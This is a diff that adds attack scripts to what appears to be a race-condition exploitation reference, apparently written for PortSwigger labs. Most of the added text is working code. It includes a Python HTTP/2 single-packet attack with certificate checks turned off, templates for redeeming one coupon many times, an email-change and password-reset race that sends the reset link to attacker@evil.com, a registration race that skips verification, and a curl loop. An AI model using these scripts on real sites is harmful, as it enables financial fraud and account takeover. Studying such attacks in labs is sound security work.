@@ -94,6 +94,202 @@ Concurrency bugs enable duplicate state changes, quota bypass, financial abuse, 
 - Redis locks without NX/EX or fencing tokens allow multiple winners
 - Locks stored in memory on a single node; bypass by hitting other nodes/regions
 
+## Practical Attack Scripts
+
+### HTTP/2 Single-Packet Attack (Core Technique)
+
+All PortSwigger race condition labs require sending multiple requests simultaneously via HTTP/2 multiplexing on a single TCP connection, ensuring they arrive in the same server processing window.
+
+```python
+#!/usr/bin/env python3
+"""HTTP/2 single-packet attack — send N requests simultaneously.
+This is the core technique for all race condition exploitation."""
+import h2.connection, h2.config, h2.events
+import socket, ssl, time
+
+TARGET = "TARGET_HOST"  # e.g., "0a1b002c..."
+PORT = 443
+COOKIE = "session=YOUR_SESSION_COOKIE"
+
+# Define the requests to send simultaneously
+REQUESTS = []
+for i in range(20):  # 20 parallel requests
+    REQUESTS.append({
+        "method": "POST",
+        "path": "/cart/coupon",  # Endpoint to race
+        "headers": {
+            "cookie": COOKIE,
+            "content-type": "application/x-www-form-urlencoded",
+        },
+        "body": "csrf=TOKEN&coupon=NEWCUST5",  # Payload
+    })
+
+def single_packet_attack(host, port, requests):
+    # Create SSL connection
+    ctx = ssl.create_default_context()
+    ctx.set_alpn_protocols(["h2"])
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    
+    sock = socket.create_connection((host, port))
+    sock = ctx.wrap_socket(sock, server_hostname=host)
+    
+    # Initialize HTTP/2 connection
+    config = h2.config.H2Configuration(client_side=True)
+    conn = h2.connection.H2Connection(config=config)
+    conn.initiate_connection()
+    sock.sendall(conn.data_to_send())
+    
+    # Send all request HEADERS first (without END_STREAM)
+    stream_ids = []
+    for req in requests:
+        headers = [
+            (":method", req["method"]),
+            (":path", req["path"]),
+            (":authority", host),
+            (":scheme", "https"),
+        ]
+        for k, v in req.get("headers", {}).items():
+            headers.append((k, v))
+        
+        body = req.get("body", "").encode() if req.get("body") else None
+        if body:
+            headers.append(("content-length", str(len(body))))
+        
+        sid = conn.get_next_available_stream_id()
+        stream_ids.append(sid)
+        conn.send_headers(sid, headers, end_stream=(body is None))
+    
+    # Flush all headers in one TCP packet
+    sock.sendall(conn.data_to_send())
+    
+    # Now send all DATA frames together (single packet = simultaneous arrival)
+    for i, req in enumerate(requests):
+        body = req.get("body", "").encode() if req.get("body") else None
+        if body:
+            conn.send_data(stream_ids[i], body, end_stream=True)
+    
+    # Send all data in ONE write = single TCP packet
+    sock.sendall(conn.data_to_send())
+    
+    # Collect responses
+    responses = {}
+    while len(responses) < len(requests):
+        data = sock.recv(65535)
+        if not data:
+            break
+        events = conn.receive_data(data)
+        for event in events:
+            if isinstance(event, h2.events.ResponseReceived):
+                responses[event.stream_id] = {"headers": dict(event.headers), "data": b""}
+            elif isinstance(event, h2.events.DataReceived):
+                if event.stream_id in responses:
+                    responses[event.stream_id]["data"] += event.data
+                conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
+        sock.sendall(conn.data_to_send())
+    
+    sock.close()
+    
+    # Print results
+    for sid in stream_ids:
+        if sid in responses:
+            status = responses[sid]["headers"].get(b":status", b"?").decode()
+            body = responses[sid]["data"].decode(errors="replace")[:200]
+            print(f"  Stream {sid}: {status} — {body}")
+    
+    return responses
+
+print(f"[*] Sending {len(REQUESTS)} requests simultaneously...")
+single_packet_attack(TARGET, PORT, REQUESTS)
+```
+
+### Multi-Endpoint Race Condition
+
+Race two different endpoints that share state. Example: change email + request password reset simultaneously, so the reset link goes to the new (attacker) email.
+
+```python
+#!/usr/bin/env python3
+"""Multi-endpoint race: race email change vs password reset."""
+# Request 1: Change email to attacker@evil.com
+# Request 2: Password reset for the account
+# If email change wins the race, reset link goes to attacker's email
+
+REQUESTS = [
+    {
+        "method": "POST",
+        "path": "/my-account/change-email",
+        "headers": {"cookie": COOKIE, "content-type": "application/x-www-form-urlencoded"},
+        "body": "csrf=TOKEN&email=attacker@evil.com",
+    },
+    {
+        "method": "POST",
+        "path": "/forgot-password",
+        "headers": {"content-type": "application/x-www-form-urlencoded"},
+        "body": "csrf=TOKEN&username=victim",
+    },
+]
+# Send via single_packet_attack() — repeat 10+ times until race succeeds
+```
+
+### Single-Endpoint Race (Limit Overrun)
+
+Redeem a single-use discount code multiple times by sending requests simultaneously:
+
+```python
+# All requests identical — redeem same coupon code 20 times
+REQUESTS = [
+    {
+        "method": "POST", "path": "/cart/coupon",
+        "headers": {"cookie": COOKIE, "content-type": "application/x-www-form-urlencoded"},
+        "body": "csrf=TOKEN&coupon=NEWCUST5",
+    }
+    for _ in range(20)
+]
+# Run single_packet_attack() — check if discount applied multiple times
+```
+
+### Partial Construction Race
+
+Access a user account during the gap between when it's created and when security controls (email verification, 2FA) are applied:
+
+```python
+# Race: Registration creates session before email verification check
+# Step 1: Start registration
+# Step 2: Simultaneously attempt to access /my-account with the session
+# The session may be valid for a brief window before verification is enforced
+
+REQUESTS = [
+    {
+        "method": "POST", "path": "/register",
+        "headers": {"content-type": "application/x-www-form-urlencoded"},
+        "body": "csrf=TOKEN&username=test&email=test@evil.com&password=pass123",
+    },
+] + [
+    {
+        "method": "GET", "path": "/my-account",
+        "headers": {"cookie": "session=PREDICTED_OR_EMPTY"},
+    }
+    for _ in range(10)
+]
+```
+
+### Timing-Based Race (Using Turbo Intruder Approach)
+
+```bash
+# If h2 library is not available, use curl with HTTP/2 multiplexing:
+# Send 20 identical requests over single connection
+for i in $(seq 1 20); do
+  curl -sk "https://TARGET/cart/coupon" \
+    -X POST \
+    -H "Cookie: $COOKIE" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "csrf=$CSRF&coupon=NEWCUST5" \
+    --http2 &
+done
+wait
+# Less precise than h2 single-packet but may work for wider race windows
+```
+
 ## Bypass Techniques
 
 - Distribute across IPs, sessions, and user accounts to evade per-entity throttles
